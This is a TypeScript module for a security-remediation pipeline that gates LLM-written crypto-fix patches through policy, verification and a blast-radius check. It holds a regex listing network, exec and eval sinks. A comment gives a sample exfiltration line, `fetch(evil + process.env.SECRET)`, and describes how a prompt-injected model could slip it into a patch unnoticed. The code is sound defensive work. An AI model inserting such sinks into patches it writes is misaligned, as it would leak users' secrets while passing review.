/**
 * The remediation pipeline: turn candidate patches (from codemods or the LLM)
 * into VERIFIED, in-policy patches. Pure and deterministic — the verify gate
 * runs `verifyFix` on the patched content in memory, so this needs no
 * filesystem or git. Callers (the `qremediate` CLI) decide what to DO with the
 * verified patches (print a diff, write them, or open a PR in a worktree).
 *
 * Two gates, both must pass:
 *   1. patch-policy   — the patch may only touch sanctioned files.
 *   2. verify_fix     — the patched content clears the target finding, adds no
 *                       new finding type, and nets fewer findings than before.
 */
import type { Finding } from "./types.js";
import type { Patch } from "./agent-types.js";
import { checkPatchPolicy } from "./patch-policy.js";
import type { PolicyContext } from "./patch-policy.js";
import { verifyFix } from "./verify.js";

export interface VerifiedPatch {
  finding: Finding;
  patch: Patch;
}
export interface RejectedPatch {
  finding: Finding;
  reason: string;
}
export interface RemediationResult {
  applied: VerifiedPatch[];
  rejected: RejectedPatch[];
}

export interface RemediateOptions {
  /** Current content of the file a finding lives in. */
  readContent: (finding: Finding) => Promise<string> | string;
  /** Produce a candidate patch for a finding (codemod or LLM), or null. */
  patchSource: (finding: Finding, content: string) => Promise<Patch | null> | Patch | null;
  /** Which files a patch is allowed to touch. */
  policy: PolicyContext;
}

/** True when `after` is a strict improvement over `before` for `finding`. */
function passesVerify(before: Finding[], after: Finding[], finding: Finding): boolean {
  const targetGone = !after.some((x) => x.ruleId === finding.ruleId);
  const noNewRuleTypes = after.every((x) => before.some((b) => b.ruleId === x.ruleId));
  return targetGone && noNewRuleTypes && after.length < before.length;
}

/**
 * Exfiltration / RCE primitives an LLM "crypto fix" should never *newly*
 * introduce. `verifyFix` only proves the crypto finding is gone — it is blind to
 * the rest of a full-file rewrite, so an injected/hostile model could drop the
 * RSA call and add `fetch(evil + process.env.SECRET)` and still pass. This guard
 * runs ONLY on `source: "llm"` patches (codemods are deterministic + trusted).
 */
const NEW_SINK_RE =
  /\b(?:fetch|XMLHttpRequest|WebSocket|navigator\.sendBeacon|child_process|execSync|execFileSync|spawnSync|exec(?:File)?\s*\(|spawn\s*\(|eval\s*\(|new\s+Function|os\.system|subprocess|Runtime\.getRuntime|require\s*\(\s*['"](?:child_process|http|https|net|dns|dgram)['"]|import\s*\(\s*['"](?:child_process|http|https|net|dns|dgram)['"])/g;

/** Max changed lines allowed in an auto-verified LLM patch — a real crypto fix
 * is localized; a sprawling rewrite is not reviewable as "just the fix". */
export const LLM_PATCH_MAX_CHANGED_LINES = 60;

function countMatches(re: RegExp, s: string): number {
  return (s.match(re) ?? []).length;
}

/** Changed lines (removed + added) between two revisions, ignoring the shared
 * prefix/suffix — same shape the CLI's unified-diff uses. */
function changedLineCount(before: string, after: string): number {
  const a = before.split("\n");
  const b = after.split("\n");
  let start = 0;
  while (start < a.length && start < b.length && a[start] === b[start]) start++;
  let endA = a.length - 1;
  let endB = b.length - 1;
  while (endA >= start && endB >= start && a[endA] === b[endB]) {
    endA--;
    endB--;
  }
  return Math.max(0, endA - start + 1) + Math.max(0, endB - start + 1);
}

/** Reason an LLM patch is unsafe to auto-verify, or null when it is bounded. */
function llmPatchRisk(before: string, patch: Patch): string | null {
  if (countMatches(NEW_SINK_RE, patch.newContent) > countMatches(NEW_SINK_RE, before)) {
    return "LLM patch introduces a new network/exec/eval sink (possible prompt-injection); rejected — review the diff manually";
  }
  const changed = changedLineCount(before, patch.newContent);
  if (changed > LLM_PATCH_MAX_CHANGED_LINES) {
    return `LLM patch changes ${changed} lines (> ${LLM_PATCH_MAX_CHANGED_LINES}); too broad to auto-verify — review the diff manually`;
  }
  return null;
}

/**
 * Run each finding through patchSource → policy → verify, collecting the patches
 * that survive both gates and the reasons the rest were dropped.
 */
export async function remediateFindings(
  findings: readonly Finding[],
  opts: RemediateOptions,
): Promise<RemediationResult> {
  const applied: VerifiedPatch[] = [];
  const rejected: RejectedPatch[] = [];

  for (const finding of findings) {
    const content = await opts.readContent(finding);
    const patch = await opts.patchSource(finding, content);
    if (!patch) {
      rejected.push({ finding, reason: "no deterministic fix available" });
      continue;
    }
    const decision = checkPatchPolicy(patch, opts.policy);
    if (!decision.allowed) {
      rejected.push({ finding, reason: decision.reason ?? "rejected by patch policy" });
      continue;
    }
    // Untrusted full-file LLM rewrites get a blast-radius gate the crypto-only
    // verify step can't provide (new-sink + change-size bound).
    if (patch.source === "llm") {
      const risk = llmPatchRisk(content, patch);
      if (risk) {
        rejected.push({ finding, reason: risk });
        continue;
      }
    }
    const before = verifyFix(content, { filename: finding.location.file }).findings;
    const after = verifyFix(patch.newContent, { filename: patch.path }).findings;
    if (!passesVerify(before, after, finding)) {
      rejected.push({ finding, reason: "patch did not pass the verify_fix gate" });
      continue;
    }
    applied.push({ finding, patch });
  }

  return { applied, rejected };
}
